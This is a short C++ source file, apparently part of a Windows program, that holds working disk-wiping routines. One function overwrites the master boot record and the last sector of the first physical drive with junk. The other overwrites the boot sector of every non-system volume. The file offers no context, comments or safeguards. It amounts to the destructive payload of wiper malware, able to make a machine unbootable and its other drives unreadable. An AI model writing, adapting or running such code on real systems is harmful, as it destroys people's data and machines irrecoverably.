// language: C++, file: src/mbr.cpp
#include "mbr.h"
#include <winioctl.h>
#include <cstdio>
#include <cstring>
#include <cstdlib>

static HANDLE open_drive(const wchar_t* path) {
    return CreateFileW(path,
                       GENERIC_READ | GENERIC_WRITE,
                       FILE_SHARE_READ | FILE_SHARE_WRITE,
                       nullptr, OPEN_EXISTING, 0, nullptr);
}

bool wipe_mbr() {
    HANDLE h = open_drive(L"\\\\.\\PhysicalDrive0");
    if (h == INVALID_HANDLE_VALUE) return false;

    DWORD written = 0;
    unsigned char junk[512];
    for (int i = 0; i < 512; i++) junk[i] = (unsigned char)(rand() & 0xFF);
    junk[510] = 0;
    junk[511] = 0;

    bool ok = WriteFile(h, junk, 512, &written, nullptr) != 0;
    if (ok) FlushFileBuffers(h);

    if (ok) {
        unsigned char filler[4096];
        memset(filler, 0xFF, sizeof(filler));
        SetFilePointer(h, 512, nullptr, FILE_BEGIN);
        ok = WriteFile(h, filler, sizeof(filler), &written, nullptr) != 0;
        if (ok) FlushFileBuffers(h);
    }

    if (ok) {
        GET_LENGTH_INFORMATION len{};
        DWORD ret = 0;
        if (DeviceIoControl(h, IOCTL_DISK_GET_LENGTH_INFO,
                            nullptr, 0, &len, sizeof(len), &ret, nullptr)) {
            if (len.Length.QuadPart > 1024) {
                LARGE_INTEGER pos;
                pos.QuadPart = len.Length.QuadPart - 512;
                SetFilePointerEx(h, pos, nullptr, FILE_BEGIN);
                unsigned char tail[512];
                memset(tail, 0xFF, sizeof(tail));
                WriteFile(h, tail, 512, &written, nullptr);
                FlushFileBuffers(h);
            }
        }
    }

    CloseHandle(h);
    return ok;
}

void wipe_ntfs_boot_sectors() {
    wchar_t sys_drive[MAX_PATH]{};
    GetEnvironmentVariableW(L"SystemDrive", sys_drive, MAX_PATH);
    wchar_t sys_letter = towupper(sys_drive[0]);

    for (wchar_t c = L'A'; c <= L'Z'; c++) {
        if (c == sys_letter) continue;
        wchar_t root[8];
        swprintf_s(root, 8, L"%c:\\", c);
        if (GetFileAttributesW(root) == INVALID_FILE_ATTRIBUTES) continue;

        wchar_t dev[16];
        swprintf_s(dev, 16, L"\\\\.\\%c:", c);
        HANDLE h = open_drive(dev);
        if (h == INVALID_HANDLE_VALUE) continue;
        DWORD written = 0;
        unsigned char junk[512];
        for (int i = 0; i < 512; i++) junk[i] = (unsigned char)(rand() & 0xFF);
        WriteFile(h, junk, 512, &written, nullptr);
        FlushFileBuffers(h);
        CloseHandle(h);
    }
}
